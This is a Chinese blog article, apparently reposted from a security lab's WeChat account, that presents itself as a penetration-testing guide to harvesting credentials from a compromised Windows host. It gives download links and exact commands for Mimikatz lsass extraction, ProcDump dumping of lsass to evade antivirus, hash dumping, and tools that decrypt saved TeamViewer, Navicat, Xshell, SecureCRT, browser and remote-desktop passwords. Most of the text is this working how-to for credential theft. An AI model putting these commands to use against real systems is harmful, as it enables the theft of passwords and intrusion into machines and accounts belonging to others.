> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Fszzammm9h_GJdyaR9X4JQ)

> 介绍：本文介绍了几种`windows`下登录凭证的获取技巧。  
> 
> 转自『宸极实验室』公众号。

**0x00 前言**
-----------

在渗透测试中，当我们拿下一台`windows`主机后，通常要对主机上的一些密码做信息收集，以便后续渗透使用，本文介绍了几种`windows`下常见的收集密码的方式。

**0x01 windows 主机密码抓取**
-----------------------

### **1.1 Mimikatz**

`windows`密码抓取神器，从`windows`系统进程`lsass.exe`中抓取明文密码。

• 下载地址：

```
https://github.com/gentilkiwi/Mimikatz
```

• 使用方法：管理员权限运行`Mimikatz.exe`，执行下面的命令：

```
privilege::debug   提取权限
sekurlsa::logonpasswords   抓取密码
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K8ialhAfBVfrzRTL4Oib2Us9f6ZeCcrVqnl3YzCqqHdZoddMyic8ngN0q8w/640?wx_fmt=jpeg)

### **1.2 ProcDump + Mimikatz**

如果主机上装了杀毒软件，开了防火墙，例如：360、火绒之类的话。`Mimikatz`就会被检测为病毒，无法使用。

由于`Mimikatz`是从`lsass.exe`中提取明文密码的，当无法在目标机器上运行`Mimikatz`时，我们可使用`ProcDump`工具将系统的`lsass.exe`进程进行转储，导出 dmp 文件，拖回到本地后，在本地再利用`Mimikatz`进行读取。

`ProcDump`本身是作为一个正常的运维辅助工具使用，并不带毒，所以不会被杀软查杀。

• 下载地址：

```
https://docs.microsoft.com/zh-cn/sysinternals/downloads/ProcDump
```

• 使用方法：

```
# 将工具拷贝到目标机器上执行如下命令（需要管理员权限）
ProcDump.exe -accepteula -ma lsass.exe lsass.dmp

Mimikatz# sekurlsa::minidump lsass.dmp

Mimikatz# sekurlsa::logonPasswords full
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K8vMKPiacntr5hxqFL2cEkweKL9DzLGZIeTnxMpibjia58wBAfaxOjibrWjA/640?wx_fmt=jpeg)

### **1.3 PwDump7**

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K8w6b4kxnZNyaMzOLKE5z65TJWVeMPW2jlDLMXicSj7ia8AeuJwzuHzQibA/640?wx_fmt=jpeg)

使用该工具获取`hash`值之后，可到`cmd5.com`进行解密。

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K8oXK3co4YficvzJ8yh4p19s7FIhjqrpcFomUEB8FHpz7egKIECcMCn8Q/640?wx_fmt=jpeg)

### **1.4 Getpass**

• 下载地址：

```
https://raw.githubusercontent.com/k8gege/K8tools/master/GetPassword_x64.rar
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K85EGic6IgibLibC6NqaEphtBPYibTIApIZ6lWOibRCqHRcV796libxluULVIQ/640?wx_fmt=jpeg)

**0x02 第三方运维工具密码抓取**
--------------------

### **2.1 TeamViewer**

• 下载地址：

```
https://github.com/uknowsec/SharpDecryptPwd/raw/master/SharpDecryptPwd.exe
```

• 使用方法：

```
SharpDecryptPwd.exe -TeamViewer
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K82fdcN6IiaBSaicm38OnDhdYHbZoAo16jtEU3qicLy6qGdsLPhrhEaaYTg/640?wx_fmt=jpeg)

### **2.2 Navicat**

• 下载地址：

```
https://github.com/uknowsec/SharpDecryptPwd/raw/master/SharpDecryptPwd.exe
```

• 使用方法：

```
SharpDecryptPwd.exe -NavicatCrypto
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K8LmRNZjBcgb0pvibTic24mia4VGfibmtwuKn2HGRkDbq5ZibqQtNXFyic4XwA/640?wx_fmt=jpeg)

### **2.3 xshell**

• 下载地址：

```
https://github.com/uknowsec/SharpDecryptPwd/raw/master/SharpDecryptPwd.exe
```

• 使用方法：

```
先执行 `whoami /user` 将用户名和sid保存下来，然后再使用下面的命令:
SharpDecryptPwd.exe -Xmangager -p SessionPath -s username+sid
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K83vJNOVoQXnbK8j3CJ2SOTCXAfbhJftOjvkibLibTqSFOAkeLcy0OwIxw/640?wx_fmt=jpeg)

### **2.4 securecrt**

• 下载地址：

```
https://github.com/hustlibraco/Moye/blob/master/SecureCRTDecrypt.py
```

• 使用方法：

```
解密secureCRT保存的密码
1. 找到密码保存位置，每台服务器一个ini文件，windows系统位于
* 用户名\AppData\Roaming\VanDyke\Config\Sessions\    （安装版）
*SecureCRTSecureFX_hh_x86_7.0.0.326\Data\Settings\Config\Sessions  （绿色移动版）
2. 执行脚本，python SecureCRTDecrypt.py [filename...]
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K8ZNiaOhBTl94NyPl0UeOicbov6Mib1wGhb2wSs9a9mj7VQD5kre0pgL1Zw/640?wx_fmt=jpeg)

**0x03 浏览器密码抓取**
----------------

### **3.1 LaZagne**

• 下载地址：

```
https://github.com/ethicalhackeragnidhra/LaZagne/archive/2.3.1.zip
```

• 使用方法：

```
laZagne.exe browsers
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K8S3q8fGsfgZnCX1ukrc8PEToEGUwDcA91mPxGAKjXp0vV5BW46o9rRA/640?wx_fmt=jpeg)

### **3.2 BrowserPasswordDump**

• 下载地址：

```
https://files1.majorgeeks.com/020c4877362530fccadf006a858f56ee9637177d/covertops/BrowserPasswordDump.zip
```

• 使用方法：

```
点击setup安装完成以后，即可提取出单文件来运行使用。
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K8LEDsaxyLevAz5B6SfftZwjekMttb5PMmXFXeo8ic2jvxR9ibRcicHU7kQ/640?wx_fmt=jpeg)

**0x04 远程桌面连接密码抓取**
-------------------

### **4.1 netpass**

• 下载地址：

```
https://www.nirsoft.net/toolsdownload/netpass-x64.zip
```

• 使用说明：

```
使用管理员权限运行即可
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfUNwkO1J4dzGPVoyXsq2K8ECFS5ic61AXbeEzESQsumeiafJiacTgUibLsQ4L8Wksl3qkiaibV84KrKv7g/640?wx_fmt=jpeg)

**0x05 总结**
-----------

1、上述描述的抓取密码的方式，大部分需使用管理员权限才能抓取。

2、`windows`密码仅在`win2008`及以下可使用，`win10`及`server2012`及以上默认不保存明文密码，无法使用工具抓取。

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**